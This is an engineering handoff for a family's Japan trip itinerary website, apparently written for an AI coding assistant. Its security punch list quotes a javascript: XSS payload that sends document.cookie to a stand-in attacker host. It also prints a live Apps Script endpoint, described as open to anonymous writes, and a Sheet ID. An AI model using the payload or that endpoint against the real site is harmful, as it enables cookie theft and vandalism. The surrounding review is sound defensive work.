# Japan 2026 Family Itinerary — Engineering Handoff

> **Purpose:** Hand the entire project off to a Claude (or other AI) coding
> assistant working from **GitLab + Netlify** with no prior context. Read this
> top-to-bottom before making the first code change.
>
> **Maintainer of record:** Charlie (Kyle's husband) — lead trip planner and
> primary editor of the live site.
>
> **Previous workflow:** GitHub (`chunty23/Japan-itinerary`) → Netlify auto-deploy.
> **New workflow:** GitLab (TBD repo URL) → Netlify auto-deploy. Functionally
> identical — only the git remote and the auth pattern change.

---

## 1. The trip itself (must memorize before editing content)

**Dates:** May 21 – June 8, 2026 (19 days).

**Travelers (7):**
1. Kyle & Charlie (K&C) — primary planners
2. Bob & Wendy (B&W) — Charlie's parents
3. Cody & JJ — couple
4. Brady — solo

**Route:** Kagoshima → Fukuoka → Kumamoto → Hiroshima → Miyajima → Himeji →
(Osaka / Nara day-trips) → Nagano → Kyoto → Hakone → Atami → Izu → Tokyo → Narita →
Seoul (ICN transit) → Home.

### Dietary constraints — CRITICAL, non-negotiable

| Person       | Restriction                                                |
| ------------ | ---------------------------------------------------------- |
| **Brady**    | **No egg in any form** — including egg-wash, mayo, custard |
| **Cody & JJ** | **No seafood, shellfish, or fish dashi** (incl. bonito flakes, dashi-based broths) |
| Everyone else | No restrictions                                            |

When suggesting restaurants, dishes, dining bookings, or food-related copy, you
**must** double-check both restrictions. "Vegetarian" alone is not sufficient
because dashi is hidden in nearly every Japanese broth. Always note when a
broth is non-seafood (kombu/mushroom-based) or when egg-substitution is
possible. **Skip pure-konbini suggestions** — the group wants real meals.

### Other persistent rules

- "✓" or "✓ Booked" markers indicate confirmed reservations. Do not invent
  bookings.
- The Shinkansen Kyoto → Tokyo segment goes on the **left side** for Mt. Fuji views.
- Suica is loaded in Apple Wallet for K&C; physical IC cards for others.
- Hakone → Tokyo transition: Nol Hakone shuttles depart Gora at 15:00 / 15:30 / 16:30.

---

## 2. Repository layout

```
Japan-itinerary/
├── index.html              # Single-page app shell (HTML + all CSS inline)
├── app.js                  # Tab rendering + map + interactions
├── search.js               # Smart search modal + index (added 2026-04-28)
├── extras.js               # Identity gate + collaborative add modal
├── data.js                 # ~218 KB generated JSON of all trip data
├── config.js               # Google Maps API key shim (Netlify-templated)
├── config.local.js         # Local dev key override (gitignored)
├── data-loader.js          # (legacy, may be empty)
├── netlify.toml            # Build config — sed-replaces API key at deploy
├── apps_script.gs          # Google Apps Script for collaborative add (deploy
│                           #   to script.google.com manually, NOT via repo)
├── build_data.py           # Regenerates data.js from the .xlsx workbook
├── geocode.py              # One-off geocoding helper
├── apply_coords.py         # Apply outlier coord fixes to data.js
├── Japan 2026 enhanced.xlsx # Source spreadsheet (for build_data.py)
├── japan2026-mymaps*.csv   # Google My Maps export (places dataset source)
├── coord-cache.json        # Cached place coordinates
├── geocode-cache.json      # Cached forward-geocoding results
├── HANDOFF.md              # ORIGINAL handoff (data-content focused — still useful)
├── HANDOFF_CLAUDE.md       # ⬅ THIS FILE — engineering / workflow handoff
└── SETUP_EDITING.md        # Apps Script web-app setup (one-time)
```

### What lives where (mental model)

- **All page-render logic** is plain DOM string templating in `app.js`. There
  is no framework, no bundler, no virtual DOM. Each `render*()` function
  builds an HTML string and assigns it to a `#tab-*` div's `innerHTML`.
- **All trip data** is in `data.js` as a single global `const DATA = {...}`,
  except `DATA.savedPlaces` which is appended afterward via `DATA.savedPlaces = [...]`.
- **All styles** are inline in `<style>` inside `index.html`. There is no
  external CSS file. Theme is controlled by `body.dark` class.
- **Search** is the only feature that loads a separate JS file (`search.js`)
  loaded **last** so it can read `DATA.*` and DOM after `app.js` has rendered.

---

## 3. Top-level data shape (`data.js`)

```js
const DATA = {
  days:        [...]   // 20 items: 1 header row + 19 actual days
  food:        [...]   // 55 restaurants/food experiences
  attractions: [...]   // 61 sights
  shopping:    [...]   // 31 stores
  tips:        [...]   // 34 field tips
  wards:       [...]   // 142 picks for Tokyo wards (Sam's Guide tab)
  icn:         [...]   // 48 rows for ICN skincare game plan
  dining:      [...]   // 41 group-dining vetted restaurants
  bookingPlatforms: [...]  // 7 platforms (Klook, etc.)
  dietaryCards: [...]
  transport:   [...]   // 79 rows of routing notes
  bookings:    [...]   // 26 confirmed reservations
  packing:     [...]   // 38 items
  phrasebook:  [...]   // 31 phrases
  mapPoints:   [...]   // 35 deprecated map points (use savedPlaces instead)
  dayMeta:     {...}   // per-day enrichments keyed by day number
};

DATA.savedPlaces = [    // ~170+ entries from Google My Maps
  { name, address, category, note, emoji, city, color, url, lat, lng }, ...
];
```

### Field shapes that matter for search

After `search.js` initializes, every entry in these collections gets a
stable `_sid` used for scroll-targeting — do **not** rename or remove. If
you re-shape data, regenerate `_sid` consistently or search-result clicks
will dead-end.

---

## 4. The 14 tabs (each is a `#tab-*` div populated by a render fn)

| Order | Tab name        | data key                  | render fn          | Notes |
| ----- | --------------- | ------------------------- | ------------------ | ----- |
| 1     | 📍 Today        | computed from `days`      | `renderToday()`    | Auto-jumps to current day or pre-trip countdown |
| 2     | 🗾 Itinerary    | `days`                    | `renderItinerary()` | Expandable day-cards with `data-day`/`data-sid` |
| 3     | 🗺️ Map          | `savedPlaces`             | `initMap()`        | Leaflet 1.9.4 + Google Maps Embed for place panel |
| 4     | ✅ Bookings     | `bookings`                | `renderBookings()` | Grouped by `category` (Flights/Hotels/Trains/Activities/To Book) |
| 5     | 🍜 Food         | `food`                    | `renderGridTab()`  | `must-try` flag = booked |
| 6     | 🍽️ Group Dining | `dining`                  | `renderDining()`   | Has its own search box (kept for in-tab filter) |
| 7     | 🏯 Attractions  | `attractions`             | `renderGridTab()`  | |
| 8     | 🛍️ Shopping     | `shopping`                | `renderGridTab()`  | |
| 9     | 🚄 Transport    | `transport`               | `renderTransport()` | Renders raw arrays as rows |
| 10    | 🎒 Packing      | `packing`                 | `renderPacking()`  | localStorage-backed checkboxes |
| 11    | 🗣️ Phrasebook   | `phrasebook`              | `renderPhrasebook()` | Click card → SpeechSynthesis (ja-JP) |
| 12    | 💡 Tips         | `tips`                    | `renderTips()`     | |
| 13    | 📖 Sam's Guide  | `wards`                   | `renderSams()`     | Local picks across Tokyo wards |
| 14    | 🇰🇷 ICN Skincare | `icn`                     | `renderICN()`      | Day-19 transit shop plan |

`switchTab(name, opts)` (`app.js:76`) is the canonical way to change tabs from
JS — it activates the button, the pane, scrolls the underline into view, and
invokes `initMap()` lazily for the Map tab.

---

## 5. Top-bar (toolbar) layout — current state

Position: sticky, transparent over hero, becomes opaque (`#0d0606`) when
scrolled (`.topbar.scrolled` class added by `extras.js`).

```
[ PDF pill ] [ ☀/🌙 ] ───── (title appears when scrolled) ───── [ 🔍 ]
   left                                                          right
```

- **PDF button** (`#pdfBtn`) → opens section-picker dialog → builds printable
  HTML → `window.print()`. Printable view defined in `<style>` under
  `PRINTABLE PDF VIEW`.
- **Dark toggle** (`#darkToggle`) → toggles `body.dark`, persists to
  `localStorage['japan2026_theme']`.
- **Search** (`#searchBtn`) → opens `#searchBackdrop` modal (see §7).

All three are 40px tall and live in the same flex row. **Do not break this
alignment** — `.icon-btn { width:40px; height:40px }` and `.pill-btn` is
constrained to the same vertical metric.

---

## 6. Identity + collaborative add (extras.js)

There is a "+ Add" floating action button (FAB) that lets group members add
new places, bookings, transport rows, or day items. It writes through a
**Google Apps Script web app** that appends rows to a shared Google Sheet
(see §8). Before any add, an **identity gate** modal forces the user to pick
their name + provide an email — stored in `localStorage['japan2026_identity']`
as `JSON.stringify({name, email})`. Choose from 7 traveler dropdown + "Other".

Functions exposed: `getIdentity()`, `saveIdentity()`, `clearIdentity()`,
`promptIdentity()`, `ensureIdentity()`. `collectForm()` auto-attaches
`added_by` and `added_by_email` to every payload.

Apps Script web-app URL is hard-coded in `index.html`:

```html
<script>window.JAPAN2026_APPS_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbzs3zGL0C5mBU8o_VpJZ-52_GgDeBfBDMPo-ZSA-quileuEdfXKr62UX8ckuLpaP1UfkA/exec";</script>
```

If you redeploy the Apps Script (which mints a new URL), update this string
and push.

---

## 7. Search feature (`search.js`, added 2026-04-28)

**Trigger:** click 🔍 button (top-right) or press ⌘/Ctrl-K anywhere.

**Modal anatomy** (`#searchBackdrop` → `.search-modal`):

1. Search input row (`.search-input-row`) — magnifier icon + `<input>` + clear (×).
2. Filter chips (`.search-filters`) — `All` plus one per category in `CATEGORIES`.
3. Results list (`.search-results`) — buttons rendered as `.search-result`.

**Categories indexed (13 + All):** Days, Bookings, Places, Food, Group Dining,
Attractions, Shopping, Transport, Packing, Phrasebook, Tips, Sam's Guide.

**Scoring** (in `scoreEntry()`):

| Signal                                       | Score |
| -------------------------------------------- | ----- |
| Whole phrase substring in title              | +1000 |
| …and starts with phrase                      | +500  |
| Whole phrase substring in body               | +400  |
| Token in title                               | +120  |
| Token at word boundary in title              | +60   |
| Token in body                                | +50   |
| Token char-subsequence in body (typo-tol)    | +18   |
| All-tokens subsequence fallback              | +8    |
| Length penalty                               | up to −40 |

**Click behavior** (`goToResult()`):

1. Close modal.
2. **Places** → `switchTab('map')` then `openPlacePanel(idx)` (markers aren't
   individual DOM nodes — only the place panel is a usable target).
3. Everything else → `switchTab(tab, {noScroll:true})`, wait 80 ms, find
   `[data-sid="..."]` inside `#tab-<tab>`, force-open any parent collapsible
   (`.day-card`, `.section-card`, `.ward-section`), scroll with sticky-header
   offset, then `applyHighlight(target)`.

**Highlight pulse** (`applyHighlight()`):

- Adds `.search-target-highlight` class — animation `searchTargetPulse`
  (light) / `searchTargetPulseDark` (dark) repeats 2× over 2.4 s with a soft
  vermilion glow + gold tint.
- Auto-clears on **wheel**, **touchmove**, or arrow/page/space/home/end key
  (whichever comes first); 6 s hard timeout backstop.
- Listeners attach 700 ms after scroll begins so the programmatic scroll
  doesn't immediately remove the pulse.

**`data-sid` contract:**

| Renderer            | sid format                                  |
| ------------------- | ------------------------------------------- |
| `renderItinerary()` | `day-<dayNumber>` on `.day-card`            |
| `renderBookings()`  | `booking-<b._sid>` on `.booking-row`        |
| `renderGridTab()`   | `<tabKey>-<f._sid>` on `.item-card`         |
| `renderDining()`    | `dining-<d._sid>` on `.dining-card`         |
| `renderTransport()` | `transport-t<i>` (synthesized in search.js) |
| `renderPacking()`   | `pack-<idx>` on `.pack-item`                |
| `renderPhrasebook()`| `phrase-<p._sid>` on `.phrase-card`         |
| `renderTips()`      | `tip-<t._sid>` on `.tip-card`               |
| `renderSams()`      | `ward-<w._sid>` on `.ward-item`             |
| Places              | (handled via `_placeIdx` → `openPlacePanel`)|

`_sid` values are **assigned by the render functions** the first time they
run (`p._sid = 'p'+i`, etc.). search.js reuses those same suffixes when
building its index. If you add a new render path, follow this pattern and
add a corresponding `CATEGORIES` entry in `search.js`.

If `rerenderActiveTab()` is called (after collaborative add or on
60 s `setInterval`), `search.js` wraps the original to also call
`buildIndex()` so new rows are searchable immediately.

---

## 8. Build / data pipeline

**You almost never need to run this.** `data.js` is regenerated only when the
underlying spreadsheet (`Japan 2026 enhanced.xlsx`) or My Maps CSV changes.

Pipeline:

1. Edit `Japan 2026 enhanced.xlsx` (or the linked Google Sheet — but the
   `.xlsx` in repo is the source of truth for `build_data.py`).
2. Optionally edit `japan2026-mymaps-v2.csv` for the saved places.
3. Run `python3 build_data.py`. This:
   - Reads all sheets via `openpyxl`.
   - Brace-walks the existing `DATA.savedPlaces = [...]` so it preserves it
     across rebuilds (places aren't in the .xlsx).
   - **Sanitizer pass:** flips specific bookings between Booked/To Book based
     on hard-coded rules. Currently:
     - Itsuki Chaya → `To Book` always.
     - Chanko Wanko → `Booked`, day 14, 18:00 JST, with a fixed details string.
   - Re-injects `✓ BOOKED` / strips it from Day-14 highlights/activities lines.
   - Writes new `data.js`.
4. `git add data.js && git commit && git push`. Netlify auto-deploys (~30–60 s).

**Do NOT hand-edit `data.js` for content changes.** Edit the .xlsx and
regenerate. You may hand-edit only if a single-line patch is unavoidable
(e.g. fixing a typo right before a deploy) — then update the .xlsx so the
next regen doesn't clobber it.

`apps_script.gs` is **not deployed via the repo** — it lives inside the
Google Sheet's bound script editor. Update there, redeploy as a new web-app
version, and update `JAPAN2026_APPS_SCRIPT_URL` in `index.html` if the URL changes.

---

## 9. Local development

```bash
cd Japan-itinerary
python3 -m http.server 5000
open http://localhost:5000          # macOS
# or visit in any browser
```

Port 5000 is the convention used in past sessions and what the QA scripts
expect. Anything else works locally too.

For Google Maps Embed to function locally, paste a key once via URL:

```
http://localhost:5000/?gmapsKey=AIza...
```

`config.js` stores it in `localStorage['japan2026_gmaps_key']` for subsequent
visits. (See "API key handling" in §10 for security constraints.)

For local-only edits without polluting git:

```bash
cp config.js config.local.js
# edit config.local.js with your key
# config.local.js is loaded with onerror="this.remove()" so missing file is fine
```

`config.local.js` should be in `.gitignore` (verify when you set up the GitLab
clone).

---

## 10. Deployment — Netlify

**Site:** https://japan2026clegg.netlify.app
**Site ID:** `cda9b9c3-65fc-4598-96e5-a5c87e1d5dfa`
**Trigger:** every push to `main`.

`netlify.toml`:

```toml
[build]
  publish = "."
  command = "sed -i \"s|%GOOGLE_MAPS_API_KEY%|${GOOGLE_MAPS_API_KEY}|g\" config.js"

[build.environment]
  NODE_VERSION = "20"
  SECRETS_SCAN_OMIT_KEYS = "GOOGLE_MAPS_API_KEY"
  SECRETS_SCAN_SMART_DETECTION_ENABLED = "false"
```

The build replaces the literal `%GOOGLE_MAPS_API_KEY%` placeholder in
`config.js` with the value of the `GOOGLE_MAPS_API_KEY` env var.

**Both `SECRETS_SCAN_*` lines are required** — Netlify runs two scanners on
the publish dir: an env-var scan (suppressed by `OMIT_KEYS`) and a smart
pattern-detection scan that flags anything starting with `AIza…`
(suppressed by `SMART_DETECTION_ENABLED=false`). If you remove either,
the deploy fails with "Secrets scanning found secrets in build." Bitten
twice in 2026-04 — see commits `faa0e4b`, `5a50a0d`.

### API key handling — read carefully

- `GOOGLE_MAPS_API_KEY = AIzaSy…REDACTED` — real value lives only in the Netlify env var (and the local `config.local.js` for dev). **Do not paste the literal key into this doc** — Netlify's smart secret-scanner pattern-matches `AIza…` strings in repo files and fails the build, regardless of how the env var itself is configured.
- This is a **client-side, HTTP-referrer-restricted** key. Allowed referrers
  in Google Cloud Console:
  - `https://japan2026clegg.netlify.app/*`
  - `http://localhost:*` (dev)
- In Netlify env vars, this var **must NOT be marked "Contains secret values"**.
  If you mark it secret, Netlify's secret-scan flags it (it ends up in shipped
  client JS by design) and the build fails.
- If you rotate the key, also update the Cloud Console referrer list.

### Migrating to GitLab

1. Create the GitLab project (private).
2. Push the existing repo: `git remote set-url origin <gitlab-url> && git push -u origin main`.
3. In Netlify: **Site settings → Build & deploy → Continuous deployment →
   Linked repository → Edit settings**. Choose GitLab, authorize, point to
   the new project, branch `main`. Build command and publish dir stay the same.
4. Confirm `GOOGLE_MAPS_API_KEY` env var is still set (it should survive the
   repo swap, but verify).
5. Push a no-op commit to `main` to trigger the first GitLab-sourced deploy.
6. Verify the deploy at the same Netlify URL — it doesn't change.

**For Claude (or any AI) to push to GitLab from a subagent / automation:**
follow whatever connector or PAT-based auth pattern the new environment
provides. The previous pattern was `gh` CLI with `api_credentials=["github"]`;
the GitLab equivalent will be a project access token or `glab` CLI. Don't
hard-code tokens — surface them through environment-level credentials.

---

## 11. Coding conventions & gotchas

### File-editing pitfalls

- `app.js` contains **Unicode em-dashes** (`─`) inside CSS-string class names.
  Some line-edit tools (notably `edit` with old/new strings) can choke on
  these. When in doubt, use `python3` with explicit UTF-8 read/write:

  ```python
  with open('app.js','r',encoding='utf-8') as f: s = f.read()
  s = s.replace('OLD','NEW')
  with open('app.js','w',encoding='utf-8') as f: f.write(s)
  ```

- After every JS edit run `node --check app.js && node --check search.js && node --check extras.js`.
- After every data.js regen run `node --check data.js`.

### CSS / layout

- **Mobile horizontal-overflow guard is non-negotiable** — and it MUST use
  `overflow-x: clip`, NOT `overflow-x: hidden`, on both `html` and `body`.
  Per CSS spec, `overflow: hidden` on an ancestor creates a scroll-clip
  container that breaks `position: sticky` on the toolbar and tab-nav (the
  header just scrolls away "like a PDF"). `overflow-x: clip` provides the
  same horizontal-overflow protection without that side effect. Browser
  support: Chrome 90+, Firefox 81+, Safari 16+ — well within target.
  Bitten by this in 2026-04 (commit `e2a87cb` → fixed in `848a82b`).
- **Do not set `body { max-width: 100vw }`** either — superfluous once
  `overflow-x:clip` is in place and a known iOS-Safari sticky-breaker
  (100vw includes the scrollbar gutter on desktop).
- **Watch out for any code path that sets `body.style.overflow='hidden'`
  or `documentElement.style.overflow='hidden'`** (e.g. modal open/close
  in `extras.js`, `search.js`). Same mechanism — if the restore is missed
  due to an exception, the sticky toolbar dies. Wrap in try/finally.
- Content containers carry `min-width:0` and `overflow-wrap:anywhere` so flex
  children can shrink.
- **The map (`#tab-map`) and tab-nav (`.tab-nav`) opt back into horizontal
  scrolling internally** — don't add a global `overflow-x` rule that breaks them.
- **Tab nav is horizontal-scroll only:** `overflow-y:hidden`,
  `touch-action:pan-x`, `overscroll-behavior-y:contain`. If you change this,
  vertical drag inside the strip will hijack page scroll on iOS.
- **Desktop centers tabs at 1280px+** with `justify-content:center`. All 14
  tabs fit at that breakpoint. Mobile (<900) keeps left-aligned scroll.
- **Region divider label wraps multi-line** on narrow screens
  (`.region-divider .label { white-space:normal; overflow-wrap:anywhere }`)
  — the long Miyajima/Himeji/Kyoto label was the original culprit for
  horizontal page overflow.
- **Topbar safe-area:** `--topbar-h: calc(env(safe-area-inset-top) + 60px)`.
  The hero, the sticky tab-nav, and the printable view all reference this
  variable — don't duplicate the calc inline.

### Search-feature gotchas

- `search.js` MUST be the last script tag (after `app.js` and `extras.js`) so
  `DATA.*` and `window.openPlacePanel` are defined when it builds the index.
- The wrapping `(function(){'use strict'; ... })()` is intentional — keep
  module isolation; only `window._buildSearchIndex` is exported (for debug).
- `escRe()` is local to `search.js` and only handles regex meta-chars. Do not
  use it for HTML escaping — there's a dedicated escaper in the `highlight()` helper.
- `cssEscape()` only escapes `\` and `"` because all our `_sid` values are
  alphanumeric + dashes. If you start using arbitrary user-supplied strings
  in sids, switch to `CSS.escape()`.

### Render-fn invariants

- Every render function uses `el.innerHTML = html` — no incremental updates.
  This is fine for ~200-row tables but obviously not scalable. If you need
  10k+ rows, switch to a proper framework (don't bolt React onto this).
- Each render fn pre-assigns `_sid` to its data items. Keep this when you
  add new render fns or new categories — search relies on it.
- `toggleOpen(el)` (in app.js) toggles a `.open` class. Cards/sections/wards
  all use the same pattern. Don't reimplement.

### Date / "today" logic

- `getCurrentDayIndex()` finds the current day from `DATA.days` based on
  `date_iso`. Pre-trip → 0; post-trip → last; mid-trip → match.
- `renderToday()` runs every 60 s via `setInterval` so countdowns refresh.

---

## 12. Workflow patterns that have worked

Based on prior sessions:

1. **Plan, then execute.** Use a todo list whenever you have ≥3 steps.
2. **Validate before commit.** `node --check` every JS file you touched, then
   open localhost in Playwright at `393×852` (iPhone) and `1440×900` (desktop)
   to QA. Both light and dark mode if visual change.
3. **Visual QA = take a screenshot.** The user has caught issues like off-line
   tabs, hero pill rows, and horizontal overflow that aren't obvious in the diff.
4. **Commit messages are multi-line and descriptive.** Past good examples:

   ```
   Mobile: prevent horizontal page scroll (region label wrap + global guard)

   - .region-divider: flex-wrap; label wraps with overflow-wrap:anywhere
   - html/body: overflow-x:hidden; max-width:100vw global guard
   - Content containers: min-width:0 so flex children can shrink
   ...
   ```

5. **Push to `main` directly.** No PR workflow. Netlify auto-deploys (~30–60 s).
   Wait, then re-verify on the live URL with Playwright.
6. **Don't touch dining language sloppily.** "ALREADY BOOKED" / "TOP BOOKED"
   were scrubbed once already — do not reintroduce reservation-claim language
   for restaurants the group hasn't actually reserved. Currently:
   - **Itsuki Chaya = To Book** (NOT booked)
   - **Chanko Wanko = Booked**, Day 14, Wed Jun 3, 6:00 pm — keep this exact

---

## 13. Recent commit history (most relevant first)

```
faa0e4b netlify.toml: suppress secret scanners for the public Maps key
6d06704 Redact Maps API key from handoff doc to unblock Netlify deploy
848a82b Header: restore sticky toolbar + tab nav (overflow-x:hidden → clip)
29b5fda Add HANDOFF_CLAUDE.md: thorough engineering handoff for new AI assistant
a7bbf34 Search: smart fuzzy search with category filters
e2a87cb Mobile: prevent horizontal page scroll (region label wrap + global guard)
f1ae7f7 Tab nav: center on desktop (1280+), tighten padding so all 14 fit
e5a0fa9 Restore Chanko Wanko sumo dinner as Booked (it IS reserved)
3eedd41 Day 1 cleanup: drop hero pills, fix dining-reservation overstatements,
        lock tab nav to horizontal scroll
34c2399 Identity gate: required name + email before adding (localStorage, switch link)
4a3f454 Collaborative editing: + Add modal w/ Google Places, sheet-backed extras
ef7d70e Header seam: opaque scrolled toolbar + tab-nav, 1px overlap, sub-pixel-safe
6371b3b Header unity: transparent toolbar merges into hero, fix tab-nav gap
347a0b4 Header redesign: sticky blurred toolbar with SVG icons + production polish
d0e6a27 Fix jumpToDay matching '1' to all of Day 1, 10-19
c0ef2da Safe-area v2 + PDF section picker dialog
ebf2da8 Phrasebook +83 (kanji-focused), PDF export, Today auto-scroll, +65 places
642c2c1 Verify all 171 pin coordinates against Google Maps
00b1d46 Map tab v2: live Google Maps Embed listings with filterable two-pane layout
6f4527e Major revamp: Today/Map/Bookings/Packing/Phrasebook tabs, dark mode
```

---

## 14. External services & accounts

| Service                | What it's for                                       | Credentials |
| ---------------------- | --------------------------------------------------- | ----------- |
| **Netlify**            | Hosting + auto-deploy from GitLab                   | Site ID `cda9b9c3-65fc-4598-96e5-a5c87e1d5dfa` |
| **GitLab**             | Source repo (NEW — replacing GitHub)                | TBD |
| **Google Cloud**       | Maps Embed API key                                  | Restricted to netlify domain + localhost |
| **Google Sheets**      | Backing store for collaborative + Add               | Sheet ID `1vBAilO53g5teNXc3IisZ2-22_JfcPi7wiaMG-bFxCnM` |
| **Google Apps Script** | Web-app endpoint that reads/writes the sheet       | Deployment URL hard-coded in `index.html` |
| **Google My Maps**     | Source of `savedPlaces` (geocoded once)             | "Japan 2026" list |

The Google Sheet has 4 worksheets: `Places` (gid 1028949607), `Bookings`
(77730658), `Transport` (996368640), `Day_Items` (1222517716). Each has a
sample row with `status: sample` that the renderer ignores. Set `status: hidden`
to soft-delete a row from the site without losing the data.

---

## 15. Open punch list (from 2026-04-28 multi-agent review)

Six expert review agents went through the codebase on 2026-04-28. None of
the items below are blockers — the site is shipping fine. They're ordered
by impact. Pick a batch, ship it as one focused commit, watch the deploy.

### P0 — should fix this week

1. **`javascript:` URL XSS via collaborative + Add.** `esc()` in `app.js:4`
   escapes `<>&"'` but does NOT validate URL schemes. Any collab-add row
   with `url: "javascript:fetch('//attacker?'+document.cookie)"` lands in
   `<a href="…">` and fires on click. Sinks: `app.js:529, 605, 829-833`,
   `extras.js:740`. Fix: one `safeUrl(u)` helper requiring
   `^(https?:|mailto:|tel:|/|#)`; wrap all four sinks. ~5 lines.
2. **Broken HTML in ICN renderer** — `<div.section-header"` (typo + bad
   quote) at `app.js:1029`. Plan-section click handler is silently dead.
   Fix: `<div class="section-header" onclick="toggleOpen(this.parentElement)">`.
3. **Render-blocking JS chain.** `index.html:1410-1416` loads 5 scripts
   without `defer` (~620 KB blocks first paint, including Leaflet which
   most users don't need). Fix: add `defer` to all five (preserves order;
   satisfies "search.js loads last"). Lazy-load Leaflet inside `initMap()`.

### P1 — should fix before May 21

4. **iOS input auto-zoom regression** — search inputs and `.ex-input` use
   font-sizes <16px (`index.html:711, 818, 1030`), which triggers iOS
   Safari auto-zoom on focus. Bump to 16px.
5. **Body-overflow leak risk in modal flows** — `extras.js:299, 588` and
   `search.js:378, 383` set `body`/`documentElement` `style.overflow='hidden'`
   while modals are open. If an exception throws between open and close,
   the body stays locked, which kills the sticky toolbar (same symptom as
   the 2026-04-28 fix, different mechanism). Wrap in try/finally; restore
   the prior inline value, not `''`.
6. **Apps Script POST is fully open.** `apps_script.gs:28` accepts any
   anonymous JSON. A bored visitor can spam-write the Sheet, which renders
   into the live site. Add a static shared token check (~5 lines) — raises
   the bar from "anyone with the URL" to "anyone who reads the JS source"
   and lets you rotate.
7. **Apps Script GET leaks traveler emails.** `doGet` at `apps_script.gs:55`
   returns the `added_by_email` column to anonymous callers. Strip it in
   `readTab_` before responding.
8. **Identity gate bypass** — `extras.js:321` falls back to
   `{name:'Anonymous', email:''}` if localStorage is wiped between modal
   open and submit. Re-check `getIdentity()` inside the submit handler.
9. **Search index coverage gaps.** `DATA.bookingPlatforms`, `dietaryCards`,
   `mapPoints`, and ICN rows are present but unindexed. Add CATEGORY
   entries in `search.js:15-125`.
10. **Search input not debounced** — full INDEX scan per keystroke. Add
    80–120 ms debounce around `runSearch`.
11. **`rerenderActiveTab()` doesn't cover Food / Dining / Attractions /
    Shopping / Tips / Sams / Phrasebook / Packing / ICN** (`app.js:1130-1148`).
    Search routes to those tabs, finds no matching `data-sid`, dead-ends.
12. **Search dialog a11y broken** — `aria-labelledby="searchModalTitle"`
    references a nonexistent element; no `aria-activedescendant`; no
    focus-restore on close (`index.html:1387-1401`, `search.js:378-385`).
13. **Two `banner` landmarks** — both `.topbar` and `.hero` claim banner
    role. Demote `.hero` to `<section>` (`index.html:1322, 1342`).
14. **No SRI on Leaflet from unpkg CDN** (`index.html:13, 1410`). Pin
    `integrity="sha384-…"` for both files, or self-host.

### P2 — nice to have

- **Service worker for offline.** Highest value-per-LOC item. ~40 lines:
  cache HTML/JS/data/Leaflet/CARTO tiles on install; stale-while-revalidate
  for index.html. Travelers will be on spotty Japan mobile data.
- **Tab nav scroll affordance** — right-edge fade gradient hint for the 14
  tabs (`index.html:262-278`).
- **Tap targets** — `.tab-btn` ~38px on mobile (<44pt min); `.day-pill`
  ~28px. Bump padding.
- **Dark-mode `.search-cat-badge`** legibility (~3.1:1, fails AA contrast).
- **Undefined CSS vars** — `--card-bg`, `--surface-offset`, `--surface`
  referenced in `index.html` but never declared; dark-mode extras-modal
  bg falls back to `#fff` until line 771 overrides.
- **Two `<meta theme-color>`** both `#0d0606` (`index.html:6-7`); light
  mode browser chrome wrong.
- **`setInterval(renderToday, 60_000)`** wipes `#tab-today` every minute,
  losing scroll/expand state. Update countdown text in-place.
- **Tab nav ARIA** — add `role="tablist"`/`role="tab"`/`aria-selected`.
- **PDF export has no map** — render a static OSM PNG of day pins, or
  document the limitation.
- **Redundant in-tab search bars** on Food/Attractions/Shopping (the global
  ⌘K replaces them); Dining keeps its filter intentionally.

### Suggested batches

- **Batch A (security, ~30 min):** P0 #1, #2, P1 #6, #7, #8 — closes the
  only externally exploitable risks.
- **Batch B (perf & mobile, ~20 min):** P0 #3, P1 #4, #9, #10 — visible
  TTI win + no-zoom inputs + complete search.
- **Batch C (sticky-toolbar belt-and-suspenders, ~15 min):** P1 #5 alone
  — prevents the regression from coming back via a different code path.

---

## 15a. Connectors available to AI sessions (added 2026-04-28)

The user has wired up the following connectors at the Claude Code app
level. Future sessions should see them in their tool registry on session
start. **Use them** — don't fall back to web fetches or asking the user
to copy-paste data.

| Connector | What it unlocks | Likely uses |
| --------- | --------------- | ----------- |
| **Netlify** | Trigger deploys, tail build logs, read/write env vars, list deploy history, manage form submissions | Watch the deploy after a push instead of "wait 50s and re-verify"; inspect failed-build logs without copy-paste; rotate `GOOGLE_MAPS_API_KEY` end-to-end (set env var → trigger redeploy) |
| **Google Calendar** | Read existing events, create new ones, send invites | Generate the 19 day-by-day events from `DATA.days` (date, hotel, agenda, dietary cautions); add booked dining reservations (Chanko Wanko Jun 3, etc.); pre-create transit blocks for shinkansen + Hakone shuttles |
| **Gmail** | Search inbox for booking confirmations, draft messages | Pull confirmation numbers from the 7 hotel + flight + activity emails into `DATA.bookings`; pre-draft the "trip URL is live" message to the family |
| **Google Drive** | Read/write the source `Japan 2026 enhanced.xlsx` directly | Run `build_data.py` against the canonical sheet, not a stale local copy; sync changes back; share the printable PDF with the group |

Heuristics for using them well:
- Before scraping or guessing — try the connector first.
- For destructive / external-visible actions (sending emails, creating
  calendar events for everyone, modifying the canonical xlsx) — confirm
  with the user before executing.
- The Apps Script + Sheet for collaborative + Add (`apps_script.gs`,
  Sheet ID `1vBAilO53g5teNXc3IisZ2-22_JfcPi7wiaMG-bFxCnM`) is **separate**
  from the source xlsx. Don't conflate them.

---

## 16. The original handoff (HANDOFF.md)

`HANDOFF.md` (in the repo root) is the **content-focused** handoff written
when the project was first set up. It's heavy on "what is the trip" detail
(Day-1 narrative, every restaurant, etc.). Read it if you need to write
content; this file (HANDOFF_CLAUDE.md) is sufficient for engineering work.

---

## 17. Quick-start checklist for a fresh assistant

```
☐ Read this file end-to-end.
☐ Skim HANDOFF.md for content tone if doing copy work.
☐ Memorize the 3 dietary rules (Brady = no egg; Cody/JJ = no seafood/dashi).
☐ Confirm Netlify is wired to GitLab (push a no-op if uncertain).
☐ Start `python3 -m http.server 5000` in repo root.
☐ For local Maps preview, hit `?gmapsKey=…` once.
☐ When making changes:
    1. Make the smallest possible edit.
    2. `node --check` every JS file you touched.
    3. Playwright QA at 393×852 and 1440×900, light + dark.
    4. Commit with a multi-line message describing what AND why.
    5. Push, wait ~50 s for Netlify, re-verify on the live URL.
☐ If you regenerate `data.js`, also re-verify search results work.
☐ Never reintroduce "ALREADY BOOKED" / "TOP BOOKED" copy on dining
  cards. Itsuki Chaya = To Book; Chanko Wanko = Booked; everything
  else = follow what the spreadsheet says.
```

---

*Last updated: 2026-04-28 by Charlie + Claude Code session (sticky-header
fix, Netlify secret-scan workaround restored, multi-agent code review punch
list, connectors documented).*
